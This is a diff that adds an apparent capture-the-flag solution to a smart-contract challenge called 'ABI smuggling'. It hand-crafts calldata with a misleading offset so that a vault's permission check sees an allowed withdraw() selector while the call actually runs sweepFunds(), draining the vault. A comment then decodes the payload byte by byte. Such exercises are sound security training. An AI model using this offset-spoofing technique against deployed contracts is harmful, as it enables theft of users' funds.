@@ -45,6 +45,49 @@ describe('[Challenge] ABI smuggling', function () {
 
     it('Execution', async function () {
         /** CODE YOUR SOLUTION HERE */
+        console.log(`token.balance[player]: ${await token.balanceOf(player.address)}`);
+        let ABI = [
+            "function execute(address target, bytes calldata actionData)",
+            "function sweepFunds(address receiver, address token)",
+            "function withdraw(address token, address recipient, uint256 amount)"
+        ];
+        let iface = new ethers.utils.Interface(ABI);
+        let sweepFundsData = iface.encodeFunctionData("sweepFunds",[player.address, token.address]);
+        let withdrawData = iface.encodeFunctionData("withdraw", [token.address, player.address, 10000n]);
+        let excuteWithdrawData = iface.encodeFunctionData("execute", [vault.address, withdrawData]);
+        let excuteSweepFundsData = iface.encodeFunctionData("execute", [vault.address, sweepFundsData]);
+        console.log(`sweepFunds(): ${sweepFundsData}`);
+        console.log(`withdraw()  : ${withdrawData}`);
+        console.log(`excute(sweepFunds()): ${excuteSweepFundsData}`);
+        console.log(`excute(withdraw())  : ${excuteWithdrawData}`);
+        
+        let payload = "0x1cff79cd";                                                             // 1-4    : execute() function's signature
+        payload = payload + "000000000000000000000000e7f1725e7734ce288f8367e1bb143e90bb3f0512"; // 5-36   : target address
+        payload = payload + "00000000000000000000000000000000000000000000000000000000000000E0"; // 37-68  : actionData offset from end of signature to start position of actionData; 0xE0 = 224
+        payload = payload + "0000000000000000000000000000000000000000000000000000000000000000"; // 69-100 : zero papdding
+        payload = payload + "d9caed12";                                                         // 101-104: withdraw() function's signature + zero padding
+        payload = payload + "0000000000000000000000005fbdb2315678afecb367f032d93f642f64180aa3"; // 105-136: token address
+        payload = payload + "00000000000000000000000070997970c51812dc3a010c7d01b50e0d17dc79c8"; // 137-168: recipient address
+        payload = payload + "0000000000000000000000000000000000000000000000000000000000002710"; // 169-200: amount
+        payload = payload + "00000000000000000000000000000000000000000000000000000000";         // 201-228: padding
+        payload = payload + "0000000000000000000000000000000000000000000000000000000000000044"; // 229-260: size of actionData
+        payload = payload + "85fb709d";                                                         // 261-264: sweepFunds() function's signature
+        payload = payload + "00000000000000000000000070997970c51812dc3a010c7d01b50e0d17dc79c8"; // 265-286: receiver address
+        payload = payload + "0000000000000000000000005fbdb2315678afecb367f032d93f642f64180aa3"; // 287-318: token address
+        payload = payload + "00000000000000000000000000000000000000000000000000000000";         // 319-348: padding
+
+        console.log(`payload: ${payload}`);
+        tx = {
+            to: vault.address,
+            data: payload,
+            gasLimit: 2000000
+        };
+        await player.sendTransaction(tx);
+        let amount = await token.balanceOf(player.address);
+        console.log(`token.balance[player]  : ${amount}`);
+        console.log(`transfering from player wallet to recovery contract....`);
+        await token.connect(player).transfer(recovery.address, amount);
+        console.log(`token.balance[recovery]: ${await token.balanceOf(recovery.address)}`);
     });
 
     after(async function () {
@@ -54,3 +97,38 @@ describe('[Challenge] ABI smuggling', function () {
         expect(await token.balanceOf(recovery.address)).to.eq(VAULT_TOKEN_BALANCE);
     });
 });
+
+
+/**
+sweepFunds(): 0x85fb709d00000000000000000000000070997970c51812dc3a010c7d01b50e0d17dc79c80000000000000000000000005fbdb2315678afecb367f032d93f642f64180aa3
+withdraw()  : 0xd9caed120000000000000000000000005fbdb2315678afecb367f032d93f642f64180aa300000000000000000000000070997970c51812dc3a010c7d01b50e0d17dc79c80000000000000000000000000000000000000000000000000000000000002710
+excute(sweepFunds()): 0x1cff79cd000000000000000000000000e7f1725e7734ce288f8367e1bb143e90bb3f05120000000000000000000000000000000000000000000000000000000000000040000000000000000000000000000000000000000000000000000000000000004485fb709d00000000000000000000000070997970c51812dc3a010c7d01b50e0d17dc79c80000000000000000000000005fbdb2315678afecb367f032d93f642f64180aa300000000000000000000000000000000000000000000000000000000
+excute(withdraw())  : 0x1cff79cd000000000000000000000000e7f1725e7734ce288f8367e1bb143e90bb3f051200000000000000000000000000000000000000000000000000000000000000400000000000000000000000000000000000000000000000000000000000000064d9caed120000000000000000000000005fbdb2315678afecb367f032d93f642f64180aa300000000000000000000000070997970c51812dc3a010c7d01b50e0d17dc79c8000000000000000000000000000000000000000000000000000000000000271000000000000000000000000000000000000000000000000000000000
+selector.sweepFunds : 0x85fb709d
+selector.withdraw   : 0xd9caed12
+
+
+execute(sweepFunds())
+0x
+1cff79cd
+000000000000000000000000e7f1725e7734ce288f8367e1bb143e90bb3f0512
+0000000000000000000000000000000000000000000000000000000000000040                    40 = 64
+0000000000000000000000000000000000000000000000000000000000000044                    44 = 68
+    85fb709d
+    00000000000000000000000070997970c51812dc3a010c7d01b50e0d17dc79c8
+    0000000000000000000000005fbdb2315678afecb367f032d93f642f64180aa3
+    00000000000000000000000000000000000000000000000000000000
+
+execute(withdraw())
+0x
+1cff79cd
+000000000000000000000000e7f1725e7734ce288f8367e1bb143e90bb3f0512
+0000000000000000000000000000000000000000000000000000000000000040                    40 = 64
+0000000000000000000000000000000000000000000000000000000000000064                    64 = 100
+    d9caed12
+    0000000000000000000000005fbdb2315678afecb367f032d93f642f64180aa3
+    00000000000000000000000070997970c51812dc3a010c7d01b50e0d17dc79c8
+    0000000000000000000000000000000000000000000000000000000000002710
+    00000000000000000000000000000000000000000000000000000000
+
+*/
